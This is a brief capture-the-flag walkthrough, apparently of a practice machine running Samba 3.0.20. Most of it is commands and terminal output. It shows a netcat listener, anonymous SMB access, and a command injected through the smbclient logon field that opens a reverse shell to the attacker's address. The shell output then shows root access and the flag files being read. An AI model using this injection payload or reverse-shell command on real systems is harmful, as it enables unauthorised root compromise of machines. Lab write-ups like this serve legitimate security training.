used ifconfig to check my ip address ==> 10.10.14.45

used two terminals one for listening and other for exploit

1.) nc -nvlp 8888

2.) don't put any password for anonymous login

2nd terminal ==>
```
root@kali:~# smbclient -L 10.10.10.3
Enter WORKGROUP\root's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            LAME

root@kali:~# smbclient //10.10.10.3/tmp
Enter WORKGROUP\root's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> logon "./=`nc -e /bin/sh 10.10.14.45 8888`"
Password: 

```

1st terminal ==>
```
listening on [any] 8888 ...
connect to [10.10.14.45] from (UNKNOWN) [10.10.10.3] 50364
whoami
root
ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
cat home/makis/user.txt
69454a937d94f5f0225ea00acd2e84c5
cat root/root.txt
92caac3be140ef409e45721348a4e9df
```

